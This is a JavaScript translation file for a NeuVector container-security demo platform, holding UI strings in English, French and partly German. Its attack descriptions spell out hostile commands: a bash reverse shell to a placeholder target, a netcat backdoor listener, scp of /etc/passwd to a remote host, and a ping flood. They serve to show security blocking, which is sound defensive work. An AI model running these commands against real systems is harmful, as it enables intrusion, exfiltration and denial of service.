/**
 * Internationalization (i18n) module for NeuVector Demo Platform
 * Supports: English (en), French (fr), German (de), Spanish (es)
 */

const I18N_STORAGE_KEY = 'neuvector_language';

const translations = {
    en: {
        // Header
        'header.title': 'NeuVector Demo Platform',
        'header.openMenu': 'Open menu',
        'header.closeMenu': 'Close menu',
        'header.toggleConsole': 'Toggle Console',
        'header.parameters': 'Parameters',
        'header.connecting': 'Connecting...',
        'header.connected': 'Connected',
        'header.disconnected': 'Disconnected',
        'header.k8s': 'K8s:',
        'header.nvApi': 'NV API:',

        // Sidebar
        'sidebar.demos': 'Demos',
        'sidebar.selectDemo': 'Select a demo from the menu',

        // Buttons
        'btn.runDemo': 'Run Demo',
        'btn.prepare': 'Prepare',
        'btn.status': 'Status',
        'btn.reset': 'Reset',
        'btn.resetRules': 'Reset Rules',
        'btn.testConnection': 'Test Connection',
        'btn.debugCredentials': 'Debug Credentials',
        'btn.saveClose': 'Save & Close',
        'btn.testRegistry': 'Test Registry',
        'btn.runAllChecks': 'Run All Checks',
        'btn.uploadImage': 'Upload Image',
        'btn.remove': 'Remove',
        'btn.clear': 'Clear',
        'btn.createPod': 'Create Pod',
        'btn.deletePod': 'Delete Pod',
        'btn.checkStatus': 'Check Status',
        'btn.runDlpTest': 'Run DLP Test',

        // Settings Modal
        'settings.title': 'Parameters',
        'settings.tab.preparation': 'Preparation',
        'settings.tab.credentials': 'Credentials',
        'settings.tab.troubleshoot': 'Troubleshoot',
        'settings.tab.cosmetics': 'Cosmetics',

        // Settings - Preparation
        'settings.platformActions': 'Platform Actions',
        'settings.neuVectorActions': 'NeuVector Actions',
        'settings.imageRegistry': 'Image Registry',
        'settings.registryUrl': 'Registry URL',
        'settings.registryHelp1': 'Used for Admission Control test pods.',
        'settings.registryHelp2': '<strong>localhost</strong> - Local images (imagePullPolicy: Never)',
        'settings.registryHelp3': '<strong>registry.example.com/project</strong> - Private registry (imagePullPolicy: IfNotPresent)',
        'settings.prepare.title': 'Deploy demo namespace and pods',
        'settings.status.title': 'Check platform status',
        'settings.reset.title': 'Remove all demo resources',
        'settings.resetRules.title': 'Reset espion1 and cible1 to Discover mode, zero-drift baseline, and clear process rules',

        // Settings - Credentials
        'settings.neuVectorApi': 'NeuVector API',
        'settings.username': 'Username',
        'settings.password': 'Password',
        'settings.apiUrl': 'API URL',
        'settings.apiUrlHelp': 'Leave empty to use default server URL',
        'settings.enterPassword': 'Enter password',

        // Settings - Troubleshoot
        'settings.diagnostics': 'Diagnostics',
        'settings.checking': 'Checking...',
        'settings.running': 'Running...',

        // Diagnostics
        'diag.infrastructure': 'Infrastructure',
        'diag.environment': 'Environment',
        'diag.nvConfig': 'NeuVector Configuration',
        'diag.kubernetes': 'Kubernetes Cluster',
        'diag.neuVectorApi': 'NeuVector API',
        'diag.demoNamespace': 'Demo Namespace',
        'diag.demoPods': 'Demo Pods',
        'diag.nvGroups': 'NeuVector Groups',
        'diag.processProfiles': 'Process Profiles',
        'diag.dlpSensors': 'DLP Sensors',
        'diag.admissionControl': 'Admission Control',
        'diag.passed': 'passed',

        // Settings - Cosmetics
        'settings.appearance': 'Appearance',
        'settings.language': 'Language',
        'settings.pageTitle': 'Page Title',
        'settings.logo': 'Logo',
        'settings.noLogo': 'No logo',
        'settings.about': 'About',
        'settings.version': 'Version:',
        'settings.git': 'Git:',
        'settings.loading': 'Loading...',
        'settings.error': 'Error',
        'settings.unknown': 'Unknown',

        // Console
        'console.title': 'Output Console',
        'console.welcome': '[INFO] Welcome to NeuVector Demo Platform',
        'console.selectDemo': '[INFO] Select a demo from the menu to begin',

        // Status messages
        'status.testingConnection': 'Testing connection...',
        'status.connectionSuccess': 'Connection successful!',
        'status.connectionFailed': 'Connection failed:',
        'status.enterPassword': 'Please enter a password',
        'status.testingRegistry': 'Testing registry...',
        'status.resettingRules': 'Resetting rules...',
        'status.enterNvPassword': 'Please enter NeuVector password first',
        'status.failedSave': 'Failed to save settings',
        'status.disconnected': 'Disconnected',

        // Cluster
        'cluster.disconnected': 'Disconnected',
        'cluster.error': 'Error',

        // Viz labels
        'viz.source': 'Source',
        'viz.target': 'Target',
        'viz.attacker': 'Attacker',
        'viz.ready': 'Ready',
        'viz.readySelectAttack': 'Ready - Select an attack type',
        'viz.connecting': 'Connecting...',
        'viz.connectionSuccessful': 'Connection successful',
        'viz.networkBlocked': 'Network blocked by policy',
        'viz.processBlocked': 'Process blocked by SUSE Security',
        'viz.attackBlocked': 'Attack blocked by SUSE Security',
        'viz.attackSucceeded': 'Attack succeeded - consider enabling Protect mode',
        'viz.dataSentDlp': 'Data sent (DLP in Alert mode - check NeuVector logs)',
        'viz.httpSuccess': 'HTTP request successful',
        'viz.pingSuccess': 'Ping successful',
        'viz.portScanComplete': 'Port scan completed',
        'viz.commandSuccess': 'Command executed successfully',
        'viz.connectionBlockedTimeout': 'Connection blocked (timeout)',
        'viz.runningAttack': 'Running attack simulation...',

        // Viz settings
        'viz.networkPolicy': 'Network Policy',
        'viz.processProfile': 'Process Profile',
        'viz.baseline': 'Baseline',
        'viz.allowedProcesses': 'Allowed Processes',
        'viz.dataType': 'Data Type',
        'viz.customData': 'Custom Data',
        'viz.enterData': 'Enter data...',
        'viz.dlpSensors': 'DLP Sensors',
        'viz.refreshSensors': 'Refresh sensors',
        'viz.loadingSensors': 'Loading sensors...',
        'viz.noDlpSensors': 'No DLP sensors configured',
        'viz.hostnameIp': 'hostname/IP',

        // NV Events
        'events.suseSecurityEvents': 'SUSE Security Events',
        'events.admissionEvents': 'Admission Events',
        'events.clickRefresh': 'Click refresh to load events',
        'events.clearEvents': 'Clear events',
        'events.refreshEvents': 'Refresh events',
        'events.loading': 'Loading...',
        'events.configureCredentials': 'Configure SUSE Security credentials first',
        'events.noRecentEvents': 'No recent events',
        'events.noNewEvents': 'No new events since clear',
        'events.eventsCleared': 'Events cleared - showing new events only',
        'events.noAdmissionEvents': 'No admission events',
        'events.errorLoading': 'Error loading events',

        // Process rules
        'process.loading': 'Loading...',
        'process.noRules': 'No process rules',
        'process.noProcessRules': 'No rules',
        'process.errorLoading': 'Error loading rules',
        'process.error': 'Error',
        'process.notConfigured': 'Not configured',
        'process.deleteRule': 'Delete this rule',
        'process.delete': 'Delete',

        // Network rules
        'viz.networkRules': 'Network Rules',
        'viz.networkRulesWarning': 'Learned rules allow traffic in Protect mode',
        'network.noRules': 'No network rules',
        'network.deleteRule': 'Delete this network rule',
        'network.ingress': 'IN',
        'network.egress': 'OUT',
        'network.both': 'BOTH',

        // Warnings
        'warning.discoverMode': '[WARNING] Network Policy is in Discover mode — attacks will NOT be blocked. Switch to Protect to demonstrate blocking.',
        'status.syncing': 'Synchronizing with NeuVector...',

        // Admission
        'admission.controlTest': 'Admission Control Test',
        'admission.targetNamespace': 'Target Namespace',
        'admission.podName': 'Pod Name',
        'admission.controlState': 'Admission Control State',
        'admission.refreshState': 'Refresh state',
        'admission.status': 'Status',
        'admission.mode': 'Mode',
        'admission.rules': 'Admission Rules',
        'admission.noRules': 'No admission rules',
        'admission.errorLoadingRules': 'Error loading rules',
        'admission.noDescription': 'No description',
        'admission.enabled': 'Enabled',
        'admission.disabled': 'Disabled',
        'admission.creatingPod': 'Creating pod...',
        'admission.deletingPod': 'Deleting pod...',
        'admission.checkingPod': 'Checking pod...',

        // Alerts
        'alert.selectImage': 'Please select an image file',
        'alert.imageTooLarge': 'Image must be smaller than 500KB',
        'alert.failedSaveLogo': 'Failed to save logo. The image may be too large.',

        // Completion
        'complete.success': '[DONE] Operation completed successfully',
        'complete.failed': '[FAILED]',
        'complete.connectionFailed': 'Connection failed',

        // Tooltips
        'tooltip.networkPolicy': 'Network Policy controls network traffic between containers.\n\n• Discover: Learn and allow all connections\n• Monitor: Allow all, log violations\n• Protect: Block unauthorized connections',
        'tooltip.processProfile': 'Process Profile controls which processes can run in containers.\n\n• Discover: Learn and allow all processes\n• Monitor: Allow all, log violations\n• Protect: Block unauthorized processes (SIGKILL)',
        'tooltip.baseline': 'Baseline determines how process rules are generated.\n\n• zero-drift: Only processes from original image allowed\n• basic: Allow processes learned during Discover mode',
        'tooltip.allowedProcesses': 'List of processes allowed to run in this container.\n\nIn Protect mode, any process not in this list will be killed (SIGKILL, exit code 137).',
        'tooltip.networkProtect': 'Network Policy: Protect',
        'tooltip.networkMonitor': 'Network Policy: Monitor',
        'tooltip.networkDiscover': 'Network Policy: Discover',
        'tooltip.processProtect': 'Process Profile: Protect',
        'tooltip.processMonitor': 'Process Profile: Monitor',
        'tooltip.processDiscover': 'Process Profile: Discover',

        // Commands
        'cmd.httpRequest': 'HTTP request',
        'cmd.icmpPing': 'ICMP ping',
        'cmd.sshConnection': 'SSH connection',
        'cmd.portScan': 'Port scan',
        'cmd.sendDlpData': 'Send DLP test data',

        // Attack descriptions
        'attack.dosTitle': 'DoS Ping Flood',
        'attack.dosDesc': '<strong>DoS Ping Flood</strong> - Sends oversized ICMP packets (40KB) to flood the target. Command: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>If the attack succeeds:</em> The target is flooded, services become unavailable (denial of service).<br><em>Protection:</em> Blocked by NeuVector via Network Rules if ICMP traffic is not allowed.',
        'attack.backdoorDesc': '<strong>NC Backdoor</strong> - Opens a listening port with netcat to create a backdoor. Command: <code>nc -l 4444</code>.<br><em>If the attack succeeds:</em> An attacker can connect to port 4444 and gain shell access to the compromised container.<br><em>Protection:</em> Blocked by NeuVector in Protect mode as the <code>nc</code> process is not in the authorized profile (Process Profile Rules).',
        'attack.scpDesc': '<strong>SCP Transfer</strong> - Attempts to transfer a sensitive file (/etc/passwd) to a remote target. Command: <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>.<br><em>If the attack succeeds:</em> Exfiltration of sensitive data (credentials, configurations) to an attacker-controlled server.<br><em>Protection:</em> Blocked by NeuVector via network rules or process profile.',
        'attack.shellDesc': '<strong>Reverse Shell</strong> - Attempts to establish a reverse shell connection to an attacker. Command: <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>.<br><em>If the attack succeeds:</em> The attacker gains full interactive shell access to the container, enabling arbitrary command execution.<br><em>Protection:</em> Blocked by NeuVector in Protect mode as it is an unauthorized process.',
        'attack.dosFlood': 'DoS Ping Flood (40KB payload)',
        'attack.ncBackdoor': 'NC Backdoor (netcat listener)',
        'attack.fileTransfer': 'File Transfer (scp)',
        'attack.reverseShell': 'Reverse Shell',

        // Languages
        'lang.en': 'English',
        'lang.fr': 'Français',
        'lang.de': 'Deutsch',
        'lang.es': 'Español',
    },

    fr: {
        'header.title': 'NeuVector Demo Platform',
        'header.openMenu': 'Ouvrir le menu',
        'header.closeMenu': 'Fermer le menu',
        'header.toggleConsole': 'Afficher/Masquer la console',
        'header.parameters': 'Paramètres',
        'header.connecting': 'Connexion...',
        'header.connected': 'Connecté',
        'header.disconnected': 'Déconnecté',
        'header.k8s': 'K8s :',
        'header.nvApi': 'NV API :',

        'sidebar.demos': 'Démos',
        'sidebar.selectDemo': 'Sélectionnez une démo dans le menu',

        'btn.runDemo': 'Lancer la démo',
        'btn.prepare': 'Préparer',
        'btn.status': 'Statut',
        'btn.reset': 'Réinitialiser',
        'btn.resetRules': 'Réinitialiser les règles',
        'btn.testConnection': 'Tester la connexion',
        'btn.debugCredentials': 'Déboguer les identifiants',
        'btn.saveClose': 'Enregistrer et fermer',
        'btn.testRegistry': 'Tester le registre',
        'btn.runAllChecks': 'Lancer tous les tests',
        'btn.uploadImage': 'Télécharger une image',
        'btn.remove': 'Supprimer',
        'btn.clear': 'Effacer',
        'btn.createPod': 'Créer le pod',
        'btn.deletePod': 'Supprimer le pod',
        'btn.checkStatus': 'Vérifier le statut',
        'btn.runDlpTest': 'Lancer le test DLP',

        'settings.title': 'Paramètres',
        'settings.tab.preparation': 'Préparation',
        'settings.tab.credentials': 'Identifiants',
        'settings.tab.troubleshoot': 'Diagnostic',
        'settings.tab.cosmetics': 'Apparence',

        'settings.platformActions': 'Actions plateforme',
        'settings.neuVectorActions': 'Actions NeuVector',
        'settings.imageRegistry': 'Registre d\'images',
        'settings.registryUrl': 'URL du registre',
        'settings.registryHelp1': 'Utilisé pour les pods de test Admission Control.',
        'settings.registryHelp2': '<strong>localhost</strong> - Images locales (imagePullPolicy: Never)',
        'settings.registryHelp3': '<strong>registry.example.com/project</strong> - Registre privé (imagePullPolicy: IfNotPresent)',
        'settings.prepare.title': 'Déployer le namespace et les pods de démo',
        'settings.status.title': 'Vérifier le statut de la plateforme',
        'settings.reset.title': 'Supprimer toutes les ressources de démo',
        'settings.resetRules.title': 'Remettre espion1 et cible1 en mode Discover, baseline zero-drift, et effacer les règles de processus',

        'settings.neuVectorApi': 'API NeuVector',
        'settings.username': 'Nom d\'utilisateur',
        'settings.password': 'Mot de passe',
        'settings.apiUrl': 'URL de l\'API',
        'settings.apiUrlHelp': 'Laisser vide pour utiliser l\'URL par défaut',
        'settings.enterPassword': 'Entrer le mot de passe',

        'settings.diagnostics': 'Diagnostics',
        'settings.checking': 'Vérification...',
        'settings.running': 'Exécution...',

        'diag.infrastructure': 'Infrastructure',
        'diag.environment': 'Environnement',
        'diag.nvConfig': 'Configuration NeuVector',
        'diag.kubernetes': 'Cluster Kubernetes',
        'diag.neuVectorApi': 'API NeuVector',
        'diag.demoNamespace': 'Namespace de démo',
        'diag.demoPods': 'Pods de démo',
        'diag.nvGroups': 'Groupes NeuVector',
        'diag.processProfiles': 'Profils de processus',
        'diag.dlpSensors': 'Capteurs DLP',
        'diag.admissionControl': 'Contrôle d\'admission',
        'diag.passed': 'réussi(s)',

        'settings.appearance': 'Apparence',
        'settings.language': 'Langue',
        'settings.pageTitle': 'Titre de la page',
        'settings.logo': 'Logo',
        'settings.noLogo': 'Aucun logo',
        'settings.about': 'À propos',
        'settings.version': 'Version :',
        'settings.git': 'Git :',
        'settings.loading': 'Chargement...',
        'settings.error': 'Erreur',
        'settings.unknown': 'Inconnu',

        'console.title': 'Console de sortie',
        'console.welcome': '[INFO] Bienvenue sur NeuVector Demo Platform',
        'console.selectDemo': '[INFO] Sélectionnez une démo dans le menu pour commencer',

        'status.testingConnection': 'Test de connexion...',
        'status.connectionSuccess': 'Connexion réussie !',
        'status.connectionFailed': 'Échec de la connexion :',
        'status.enterPassword': 'Veuillez entrer un mot de passe',
        'status.testingRegistry': 'Test du registre...',
        'status.resettingRules': 'Réinitialisation des règles...',
        'status.enterNvPassword': 'Veuillez d\'abord entrer le mot de passe NeuVector',
        'status.failedSave': 'Échec de la sauvegarde des paramètres',
        'status.disconnected': 'Déconnecté',

        'cluster.disconnected': 'Déconnecté',
        'cluster.error': 'Erreur',

        'viz.source': 'Source',
        'viz.target': 'Cible',
        'viz.attacker': 'Attaquant',
        'viz.ready': 'Prêt',
        'viz.readySelectAttack': 'Prêt - Sélectionnez un type d\'attaque',
        'viz.connecting': 'Connexion...',
        'viz.connectionSuccessful': 'Connexion réussie',
        'viz.networkBlocked': 'Réseau bloqué par la politique',
        'viz.processBlocked': 'Processus bloqué par SUSE Security',
        'viz.attackBlocked': 'Attaque bloquée par SUSE Security',
        'viz.attackSucceeded': 'Attaque réussie - envisagez d\'activer le mode Protect',
        'viz.dataSentDlp': 'Données envoyées (DLP en mode Alert - vérifiez les logs NeuVector)',
        'viz.httpSuccess': 'Requête HTTP réussie',
        'viz.pingSuccess': 'Ping réussi',
        'viz.portScanComplete': 'Scan de ports terminé',
        'viz.commandSuccess': 'Commande exécutée avec succès',
        'viz.connectionBlockedTimeout': 'Connexion bloquée (timeout)',
        'viz.runningAttack': 'Simulation d\'attaque en cours...',

        'viz.networkPolicy': 'Politique réseau',
        'viz.processProfile': 'Profil de processus',
        'viz.baseline': 'Baseline',
        'viz.allowedProcesses': 'Processus autorisés',
        'viz.dataType': 'Type de données',
        'viz.customData': 'Données personnalisées',
        'viz.enterData': 'Entrer les données...',
        'viz.dlpSensors': 'Capteurs DLP',
        'viz.refreshSensors': 'Rafraîchir les capteurs',
        'viz.loadingSensors': 'Chargement des capteurs...',
        'viz.noDlpSensors': 'Aucun capteur DLP configuré',
        'viz.hostnameIp': 'nom d\'hôte/IP',

        'events.suseSecurityEvents': 'Événements SUSE Security',
        'events.admissionEvents': 'Événements d\'admission',
        'events.clickRefresh': 'Cliquez sur rafraîchir pour charger les événements',
        'events.clearEvents': 'Effacer les événements',
        'events.refreshEvents': 'Rafraîchir les événements',
        'events.loading': 'Chargement...',
        'events.configureCredentials': 'Configurez d\'abord les identifiants SUSE Security',
        'events.noRecentEvents': 'Aucun événement récent',
        'events.noNewEvents': 'Aucun nouvel événement depuis l\'effacement',
        'events.eventsCleared': 'Événements effacés - affichage des nouveaux événements uniquement',
        'events.noAdmissionEvents': 'Aucun événement d\'admission',
        'events.errorLoading': 'Erreur de chargement des événements',

        'process.loading': 'Chargement...',
        'process.noRules': 'Aucune règle de processus',
        'process.noProcessRules': 'Aucune règle',
        'process.errorLoading': 'Erreur de chargement des règles',
        'process.error': 'Erreur',
        'process.notConfigured': 'Non configuré',
        'process.deleteRule': 'Supprimer cette règle',
        'process.delete': 'Supprimer',

        'viz.networkRules': 'Règles réseau',
        'viz.networkRulesWarning': 'Les règles apprises autorisent le trafic en mode Protect',
        'network.noRules': 'Aucune règle réseau',
        'network.deleteRule': 'Supprimer cette règle réseau',
        'network.ingress': 'IN',
        'network.egress': 'OUT',
        'network.both': 'LES 2',

        'warning.discoverMode': '[WARNING] La politique réseau est en mode Discover — les attaques ne seront PAS bloquées. Passez en mode Protect pour démontrer le blocage.',
        'status.syncing': 'Synchronisation avec NeuVector...',

        'admission.controlTest': 'Test de contrôle d\'admission',
        'admission.targetNamespace': 'Namespace cible',
        'admission.podName': 'Nom du pod',
        'admission.controlState': 'État du contrôle d\'admission',
        'admission.refreshState': 'Rafraîchir l\'état',
        'admission.status': 'Statut',
        'admission.mode': 'Mode',
        'admission.rules': 'Règles d\'admission',
        'admission.noRules': 'Aucune règle d\'admission',
        'admission.errorLoadingRules': 'Erreur de chargement des règles',
        'admission.noDescription': 'Aucune description',
        'admission.enabled': 'Activé',
        'admission.disabled': 'Désactivé',
        'admission.creatingPod': 'Création du pod...',
        'admission.deletingPod': 'Suppression du pod...',
        'admission.checkingPod': 'Vérification du pod...',

        'alert.selectImage': 'Veuillez sélectionner un fichier image',
        'alert.imageTooLarge': 'L\'image doit faire moins de 500 Ko',
        'alert.failedSaveLogo': 'Échec de la sauvegarde du logo. L\'image est peut-être trop volumineuse.',

        'complete.success': '[FAIT] Opération terminée avec succès',
        'complete.failed': '[ÉCHEC]',
        'complete.connectionFailed': 'Échec de la connexion',

        'tooltip.networkPolicy': 'La politique réseau contrôle le trafic entre conteneurs.\n\n• Discover : Apprendre et autoriser toutes les connexions\n• Monitor : Tout autoriser, journaliser les violations\n• Protect : Bloquer les connexions non autorisées',
        'tooltip.processProfile': 'Le profil de processus contrôle quels processus peuvent s\'exécuter.\n\n• Discover : Apprendre et autoriser tous les processus\n• Monitor : Tout autoriser, journaliser les violations\n• Protect : Bloquer les processus non autorisés (SIGKILL)',
        'tooltip.baseline': 'La baseline détermine comment les règles de processus sont générées.\n\n• zero-drift : Seuls les processus de l\'image originale sont autorisés\n• basic : Autoriser les processus appris en mode Discover',
        'tooltip.allowedProcesses': 'Liste des processus autorisés dans ce conteneur.\n\nEn mode Protect, tout processus absent de cette liste sera tué (SIGKILL, code de sortie 137).',
        'tooltip.networkProtect': 'Politique réseau : Protect',
        'tooltip.networkMonitor': 'Politique réseau : Monitor',
        'tooltip.networkDiscover': 'Politique réseau : Discover',
        'tooltip.processProtect': 'Profil de processus : Protect',
        'tooltip.processMonitor': 'Profil de processus : Monitor',
        'tooltip.processDiscover': 'Profil de processus : Discover',

        'cmd.httpRequest': 'Requête HTTP',
        'cmd.icmpPing': 'Ping ICMP',
        'cmd.sshConnection': 'Connexion SSH',
        'cmd.portScan': 'Scan de ports',
        'cmd.sendDlpData': 'Envoyer des données DLP de test',

        'attack.dosTitle': 'Flood Ping DoS',
        'attack.dosDesc': '<strong>Flood Ping DoS</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande : <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Si l\'attaque réussit :</em> La cible est saturée, les services deviennent indisponibles (déni de service).<br><em>Protection :</em> Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n\'est pas autorisé.',
        'attack.backdoorDesc': '<strong>NC Backdoor</strong> - Ouvre un port d\'écoute avec netcat pour créer une backdoor. Commande : <code>nc -l 4444</code>.<br><em>Si l\'attaque réussit :</em> Un attaquant peut se connecter au port 4444 et obtenir un accès shell au conteneur compromis.<br><em>Protection :</em> Bloqué par NeuVector en mode Protect car le processus <code>nc</code> n\'est pas dans le profil autorisé (Process Profile Rules).',
        'attack.scpDesc': '<strong>SCP Transfer</strong> - Tente de transférer un fichier sensible (/etc/passwd) vers une cible distante. Commande : <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>.<br><em>Si l\'attaque réussit :</em> Exfiltration de données sensibles (identifiants, configurations) vers un serveur contrôlé par l\'attaquant.<br><em>Protection :</em> Bloqué par NeuVector via les règles réseau ou le profil de processus.',
        'attack.shellDesc': '<strong>Reverse Shell</strong> - Tente d\'établir une connexion shell inverse vers un attaquant. Commande : <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>.<br><em>Si l\'attaque réussit :</em> L\'attaquant obtient un accès shell interactif complet au conteneur, permettant l\'exécution de commandes arbitraires.<br><em>Protection :</em> Bloqué par NeuVector en mode Protect car c\'est un processus non autorisé.',
        'attack.dosFlood': 'Flood Ping DoS (payload 40KB)',
        'attack.ncBackdoor': 'NC Backdoor (écouteur netcat)',
        'attack.fileTransfer': 'Transfert de fichier (scp)',
        'attack.reverseShell': 'Reverse Shell',

        'lang.en': 'English',
        'lang.fr': 'Français',
        'lang.de': 'Deutsch',
        'lang.es': 'Español',
    },

    de: {
        'header.title': 'NeuVector Demo Platform',
        'header.openMenu': 'Menü öffnen',
        'header.closeMenu': 'Menü schließen',
        'header.toggleConsole': 'Konsole ein-/ausblenden',
        'header.parameters': 'Parameter',
        'header.connecting': 'Verbinden...',
        'header.connected': 'Verbunden',
        'header.disconnected': 'Getrennt',
        'header.k8s': 'K8s:',
        'header.nvApi': 'NV API:',

        'sidebar.demos': 'Demos',
        'sidebar.selectDemo': 'Wählen Sie eine Demo aus dem Menü',

        'btn.runDemo': 'Demo starten',
        'btn.prepare': 'Vorbereiten',
        'btn.status': 'Status',
        'btn.reset': 'Zurücksetzen',
        'btn.resetRules': 'Regeln zurücksetzen',
        'btn.testConnection': 'Verbindung testen',
        'btn.debugCredentials': 'Anmeldedaten debuggen',
        'btn.saveClose': 'Speichern & Schließen',
        'btn.testRegistry': 'Registry testen',
        'btn.runAllChecks': 'Alle Prüfungen starten',
        'btn.uploadImage': 'Bild hochladen',
        'btn.remove': 'Entfernen',
        'btn.clear': 'Löschen',
        'btn.createPod': 'Pod erstellen',
        'btn.deletePod': 'Pod löschen',
        'btn.checkStatus': 'Status prüfen',
        'btn.runDlpTest': 'DLP-Test starten',

        'settings.title': 'Parameter',
        'settings.tab.preparation': 'Vorbereitung',
        'settings.tab.credentials': 'Anmeldedaten',
        'settings.tab.troubleshoot': 'Fehlerbehebung',
        'settings.tab.cosmetics': 'Darstellung',

        'settings.platformActions': 'Plattform-Aktionen',
        'settings.neuVectorActions': 'NeuVector-Aktionen',
        'settings.imageRegistry': 'Image-Registry',
        'settings.registryUrl': 'Registry-URL',
        'settings.registryHelp1': 'Wird für Admission Control Test-Pods verwendet.',
        'settings.registryHelp2': '<strong>localhost</strong> - Lokale Images (imagePullPolicy: Never)',
        'settings.registryHelp3': '<strong>registry.example.com/project</strong> - Private Registry (imagePullPolicy: IfNotPresent)',
        'settings.prepare.title': 'Demo-Namespace und Pods bereitstellen',
        'settings.status.title': 'Plattformstatus prüfen',
        'settings.reset.title': 'Alle Demo-Ressourcen entfernen',
        'settings.resetRules.title': 'espion1 und cible1 auf Discover-Modus, zero-drift Baseline zurücksetzen und Prozessregeln löschen',

        'settings.neuVectorApi': 'NeuVector API',
        'settings.username': 'Benutzername',
        'settings.password': 'Passwort',
        'settings.apiUrl': 'API-URL',
        'settings.apiUrlHelp': 'Leer lassen für Standard-Server-URL',
        'settings.enterPassword': 'Passwort eingeben',

        'settings.diagnostics': 'Diagnose',
        'settings.checking': 'Prüfe...',
        'settings.running': 'Läuft...',

        'diag.infrastructure': 'Infrastruktur',
        'diag.environment': 'Umgebung',
        'diag.nvConfig': 'NeuVector-Konfiguration',
        'diag.kubernetes': 'Kubernetes-Cluster',
        'diag.neuVectorApi': 'NeuVector API',
        'diag.demoNamespace': 'Demo-Namespace',
        'diag.demoPods': 'Demo-Pods',
        'diag.nvGroups': 'NeuVector-Gruppen',
        'diag.processProfiles': 'Prozessprofile',
        'diag.dlpSensors': 'DLP-Sensoren',
        'diag.admissionControl': 'Zugangs-Kontrolle',
        'diag.passed': 'bestanden',

        'settings.appearance': 'Darstellung',
        'settings.language': 'Sprache',
        'settings.pageTitle': 'Seitentitel',
        'settings.logo': 'Logo',
        'settings.noLogo': 'Kein Logo',
        'settings.about': 'Über',
        'settings.version': 'Version:',
        'settings.git': 'Git:',
        'settings.loading': 'Laden...',
        'settings.error': 'Fehler',
        'settings.unknown': 'Unbekannt',

        'console.title': 'Ausgabekonsole',
        'console.welcome': '[INFO] Willkommen auf der NeuVector Demo Platform',
        'console.selectDemo': '[INFO] Wählen Sie eine Demo aus dem Menü, um zu beginnen',

        'status.testingConnection': 'Verbindung wird getestet...',
        'status.connectionSuccess': 'Verbindung erfolgreich!',
        'status.connectionFailed': 'Verbindung fehlgeschlagen:',
        'status.enterPassword': 'Bitte geben Sie ein Passwort ein',
        'status.testingRegistry': 'Registry wird getestet...',
        'status.resettingRules': 'Regeln werden zurückgesetzt...',
        'status.enterNvPassword': 'Bitte zuerst NeuVector-Passwort eingeben',
        'status.failedSave': 'Einstellungen konnten nicht gespeichert werden',
        'status.disconnected': 'Getrennt',

        'cluster.disconnected': 'Getrennt',
        'cluster.error': 'Fehler',

        'viz.source': 'Quelle',
        'viz.target': 'Ziel',
        'viz.attacker': 'Angreifer',
        'viz.ready': 'Bereit',
        'viz.readySelectAttack': 'Bereit - Wählen Sie einen Angriffstyp',
        'viz.connecting': 'Verbinden...',
        'viz.connectionSuccessful': 'Verbindung erfolgreich',
        'viz.networkBlocked': 'Netzwerk durch Richtlinie blockiert',
        'viz.processBlocked': 'Prozess durch SUSE Security blockiert',
        'viz.attackBlocked': 'Angriff durch SUSE Security blockiert',
        'viz.attackSucceeded': 'Angriff erfolgreich - Protect-Modus aktivieren empfohlen',
        'viz.dataSentDlp': 'Daten gesendet (DLP im Alert-Modus - NeuVector-Logs prüfen)',
        'viz.httpSuccess': 'HTTP-Anfrage erfolgreich',
        'viz.pingSuccess': 'Ping erfolgreich',
        'viz.portScanComplete': 'Portscan abgeschlossen',
        'viz.commandSuccess': 'Befehl erfolgreich ausgeführt',
        'viz.connectionBlockedTimeout': 'Verbindung blockiert (Zeitüberschreitung)',
        'viz.runningAttack': 'Angriffssimulation läuft...',

        'viz.networkPolicy': 'Netzwerkrichtlinie',
        'viz.processProfile': 'Prozessprofil',
        'viz.baseline': 'Baseline',
        'viz.allowedProcesses': 'Erlaubte Prozesse',
        'viz.dataType': 'Datentyp',
        'viz.customData': 'Benutzerdefinierte Daten',
        'viz.enterData': 'Daten eingeben...',
        'viz.dlpSensors': 'DLP-Sensoren',
        'viz.refreshSensors': 'Sensoren aktualisieren',
        'viz.loadingSensors': 'Sensoren werden geladen...',
        'viz.noDlpSensors': 'Keine DLP-Sensoren konfiguriert',
        'viz.hostnameIp': 'Hostname/IP',

        'events.suseSecurityEvents': 'SUSE Security Ereignisse',
        'events.admissionEvents': 'Zugangs-Ereignisse',
        'events.clickRefresh': 'Klicken Sie auf Aktualisieren, um Ereignisse zu laden',
        'events.clearEvents': 'Ereignisse löschen',
        'events.refreshEvents': 'Ereignisse aktualisieren',
        'events.loading': 'Laden...',
        'events.configureCredentials': 'Konfigurieren Sie zuerst die SUSE Security Anmeldedaten',
        'events.noRecentEvents': 'Keine aktuellen Ereignisse',
        'events.noNewEvents': 'Keine neuen Ereignisse seit dem Löschen',
        'events.eventsCleared': 'Ereignisse gelöscht - nur neue Ereignisse werden angezeigt',
        'events.noAdmissionEvents': 'Keine Zugangs-Ereignisse',
        'events.errorLoading': 'Fehler beim Laden der Ereignisse',

        'process.loading': 'Laden...',
        'process.noRules': 'Keine Prozessregeln',
        'process.noProcessRules': 'Keine Regeln',
        'process.errorLoading': 'Fehler beim Laden der Regeln',
        'process.error': 'Fehler',
        'process.notConfigured': 'Nicht konfiguriert',
        'process.deleteRule': 'Diese Regel löschen',
        'process.delete': 'Löschen',

        'viz.networkRules': 'Netzwerkregeln',
        'viz.networkRulesWarning': 'Gelernte Regeln erlauben Verkehr im Protect-Modus',
        'network.noRules': 'Keine Netzwerkregeln',
        'network.deleteRule': 'Diese Netzwerkregel löschen',
        'network.ingress': 'IN',
        'network.egress': 'OUT',
        'network.both': 'BEIDE',

        'warning.discoverMode': '[WARNING] Netzwerkrichtlinie ist im Discover-Modus — Angriffe werden NICHT blockiert. Wechseln Sie zu Protect, um die Blockierung zu demonstrieren.',
        'status.syncing': 'Synchronisierung mit NeuVector...',

        'admission.controlTest': 'Zugangs-Kontroll-Test',
        'admission.targetNamespace': 'Ziel-Namespace',
        'admission.podName': 'Pod-Name',
        'admission.controlState': 'Zugangs-Kontroll-Status',
